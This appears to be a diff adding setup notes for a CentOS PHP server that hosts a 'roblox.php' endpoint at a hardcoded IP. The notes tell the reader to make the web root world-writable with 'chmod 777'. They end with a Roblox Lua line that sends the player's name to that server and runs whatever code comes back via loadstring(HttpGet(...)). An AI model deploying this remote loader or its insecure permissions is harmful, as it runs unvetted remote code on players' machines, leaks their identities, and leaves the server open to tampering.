@@ -1,0 +1,28 @@
+**Centos 7**
+######################
+yum install php php-mysql
+sudo chkconfig httpd on
+chkconfig mysqld on
+yum install php5 - y
+service httpd restart
+######################
+#open ports
+firewall-cmd --permanent --zone=public --add-service=http 
+firewall-cmd --permanent --zone=public --add-service=https
+firewall-cmd --reload
+######################
+cd /var/www/html
+// drag roblox.php in as well as roblox.txt
+######################
+#Give cd /var/www/html chmod 777 *
+#Or it wont write to roblox.txt
+######################
+
+
+// Usage: http://104.207.140.157/roblox.php?Key=Mommy&Roblox=[]
+
+
+//use in script
+
+local LocalPlayer = game.Players.LocalPlayer
+loadstring(game:HttpGet("http://104.207.140.157/roblox.php?Key=Mommy&Roblox=" .. LocalPlayer))()
